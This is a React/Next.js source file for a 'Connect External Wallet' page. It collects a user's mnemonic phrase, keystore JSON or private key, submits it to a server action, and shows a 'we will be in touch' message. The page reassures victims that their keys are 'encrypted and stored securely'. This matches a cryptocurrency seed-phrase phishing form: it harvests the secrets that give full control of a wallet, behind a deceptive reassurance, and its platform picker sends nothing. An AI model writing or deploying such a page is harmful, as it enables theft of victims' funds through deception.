"use client"

import { Lock, Wallet } from "lucide-react"
import connectUserWallet from "@/actions/wallet.action";
import { authClient } from "@/lib/auth-client";
import { useRouter } from "next/navigation";
import { useState } from "react";
import { platforms } from "@/constants";

type ConnectionMethod = "phrase" | "keystorejson" | "privatekey"

function ConnectWallet() {
  const router = useRouter();
  const [banner, setBanner] = useState<{
    type: "success" | "error";
    message: string;
  } | null>(null);

  const showBanner = (type: "success" | "error", message: string) => {
    setBanner({ type, message });

    setTimeout(() => {
      setBanner(null);
      if (type === "success") router.push("/dashboard");
    }, 10_000);
  };

  const [connectionMethod, setConnectionMethod] = useState<ConnectionMethod>("phrase")
  const [platform, setPlatform] = useState("trustwallet")
  const [mnemonicPhrase, setMnemonicPhrase] = useState("")
  const [keystoreJson, setKeystoreJson] = useState("")
  const [privateKey, setPrivateKey] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState("")


  const handleWalletConnect = async (value: string) => {
    setError("")

    // Validate input based on connection method
    if (connectionMethod === "phrase" && !mnemonicPhrase.trim()) {
      setError("Please enter your mnemonic phrase")
      return
    }

    if (connectionMethod === "keystorejson" && !keystoreJson.trim()) {
      setError("Please paste your keystore JSON")
      return
    }

    if (connectionMethod === "privatekey" && !privateKey.trim()) {
      setError("Please enter your private key")
      return
    }
    try {
      const { error } = await connectUserWallet(connectionMethod, value);

      if (error) {
        showBanner("error", error);
        return;
      }

      setIsSubmitting(true)

      authClient.updateUser({
        walletStatus: "pending"
      }, {
        onError(context) {
          showBanner("error", context.error.message || "Something went wrong. Please try again.");
          setIsSubmitting(false)
        },
        onSuccess() {
          showBanner("success", "Thank you for connecting your wllet, we will be in touch with you regarding the status of your wallet connection");
          setIsSubmitting(false)
        }
      })
    } catch (err) {
      console.error("Error connecting wallet...", err);
      showBanner("error", "Something went wrong. Please try again.");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (connectionMethod === "phrase" && mnemonicPhrase.trim()) {
      await handleWalletConnect(mnemonicPhrase)
      return
    }

    if (connectionMethod === "keystorejson" && keystoreJson.trim()) {
      await handleWalletConnect(keystoreJson)
      return
    }

    if (connectionMethod === "privatekey" && privateKey.trim()) {
      await handleWalletConnect(privateKey)
      return
    }
  }

  return (
    <div className="w-full min-h-screen flex items-start md:items-center justify-center p-4 pb-24 md:pb-4">
      <div
        className="w-full max-w-2xl rounded-2xl p-5 sm:p-8 bg-white border border-gray-200 dark:bg-slate-900 dark:border-slate-700 my-4"
      >
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex justify-center mb-4">
            <div className="p-4 rounded-lg bg-blue-100 dark:bg-blue-600/20">
              <Wallet className="w-8 h-8 text-blue-600 dark:text-blue-400" />
            </div>
          </div>
          <h1 className="text-2xl font-bold mb-2 text-gray-900 dark:text-white">
            Connect External Wallet
          </h1>
          <p className="text-gray-600 dark:text-gray-400">
            Securely connect your wallet to manage assets
          </p>
        </div>

        {/* Connection Method Selection */}
        <form onSubmit={handleSubmit} className="space-y-6">
          {/* Banner */}
          {banner && (
            <div
              className={`my-4 rounded-md px-4 py-3 text-sm font-medium flex items-center justify-between
            ${banner.type === "success"
                  ? "bg-green-100 text-green-800 dark:bg-green-900/40 dark:text-green-300"
                  : "bg-red-100 text-red-800 dark:bg-red-900/40 dark:text-red-300"
                }
          `}
            >
              <span>{banner.message}</span>
              <button
                onClick={() => {
                  if (banner.type === "success") {
                    setBanner(null)
                    router.refresh();
                  }
                }}
                className="ml-4 text-xs opacity-70 hover:opacity-100"
              >
                ✕
              </button>
            </div>
          )}

          <div>
            <label className="block text-sm font-bold mb-4 text-gray-700 dark:text-gray-300">
              Select Connection Method
            </label>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              {[
                { value: "phrase", label: "Mnemonic Phrase\n(12-24 words)" },
                { value: "keystorejson", label: "Keystore JSON" },
                { value: "privatekey", label: "Private Key" },
              ].map((method) => (
                <label
                  key={method.value}
                  className={`cursor-pointer p-4 rounded-lg border-2 transition-all ${connectionMethod === method.value
                    ? "border-blue-500 bg-blue-50 dark:bg-blue-500/10"
                    : "border-gray-300 hover:border-gray-400 dark:border-slate-600 dark:hover:border-slate-500"
                    }`}
                >
                  <div className="flex items-center gap-3">
                    <input
                      type="radio"
                      name="connection_method"
                      value={method.value}
                      checked={connectionMethod === method.value}
                      onChange={(e) => setConnectionMethod(e.target.value as ConnectionMethod)}
                      className="w-4 h-4"
                    />
                    <span className="text-sm font-medium whitespace-pre-line text-gray-700 dark:text-gray-300">
                      {method.label}
                    </span>
                  </div>
                </label>
              ))}
            </div>
          </div>

          {/* Platform Selection */}
          <div>
            <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
              Select Platform
            </label>
            <select
              value={platform}
              onChange={(e) => setPlatform(e.target.value)}
              className="w-full px-4 py-2 rounded-lg border transition-colors font-mono text-sm bg-white border-gray-300 text-gray-900 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white"
            >
              {platforms.map((p) => (
                <option key={p.value} value={p.value}>
                  {p.label}
                </option>
              ))}
            </select>
          </div>

          {/* Input Fields - Mnemonic Phrase */}
          {connectionMethod === "phrase" && (
            <div>
              <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
                Mnemonic Phrase
              </label>
              <textarea
                value={mnemonicPhrase}
                onChange={(e) => setMnemonicPhrase(e.target.value)}
                placeholder="Enter your 12 or 24-word mnemonic phrase"
                rows={3}
                className="w-full px-4 py-2 rounded-lg border font-mono text-sm bg-white border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white dark:placeholder-gray-500"
              />
              <p className="text-xs mt-2 text-gray-600 dark:text-gray-400">
                Usually 12 or 24 words separated by spaces
              </p>
            </div>
          )}

          {/* Input Fields - Keystore JSON */}
          {connectionMethod === "keystorejson" && (
            <div>
              <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
                Keystore JSON
              </label>
              <textarea
                value={keystoreJson}
                onChange={(e) => setKeystoreJson(e.target.value)}
                placeholder="Paste your keystore JSON here"
                rows={5}
                className="w-full px-4 py-2 rounded-lg border font-mono text-xs bg-white border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white dark:placeholder-gray-500"
              />
            </div>
          )}

          {/* Input Fields - Private Key */}
          {connectionMethod === "privatekey" && (
            <div>
              <label className="block text-sm font-bold mb-2 text-gray-700 dark:text-gray-300">
                Private Key
              </label>
              <input
                type="password"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="Enter your private key"
                className="w-full px-4 py-2 rounded-lg border font-mono text-sm bg-white border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 dark:bg-slate-800 dark:border-slate-600 dark:text-white dark:placeholder-gray-500"
              />
            </div>
          )}

          {/* Error Message */}
          {error && (
            <div className={`p-3 rounded-lg text-sm ${"bg-red-100 text-red-700 dark:bg-red-500/20 dark:text-red-400"}`}>
              {error}
            </div>
          )}

          {/* Security Info Banner */}
          <div
            className="flex items-start gap-3 p-4 rounded-lg bg-blue-100 border border-blue-300 dark:bg-blue-500/20 dark:border-blue-500/50"
          >
            <Lock className="w-5 h-5 shrink-0 mt-0.5 text-blue-600 dark:text-blue-400" />
            <p className="text-sm text-blue-800 dark:text-blue-200">
              Your keys are encrypted and stored securely. We never share them with anyone.
            </p>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="w-full py-3 rounded-lg font-semibold transition-all bg-blue-500 hover:bg-blue-600 disabled:bg-blue-500/50 text-white dark:bg-blue-600 dark:hover:bg-blue-700 dark:disabled:bg-blue-600/50"
          >
            {isSubmitting ? "Connecting..." : "Connect Wallet"}
          </button>
        </form>
      </div>
    </div>
  )
}

export default ConnectWallet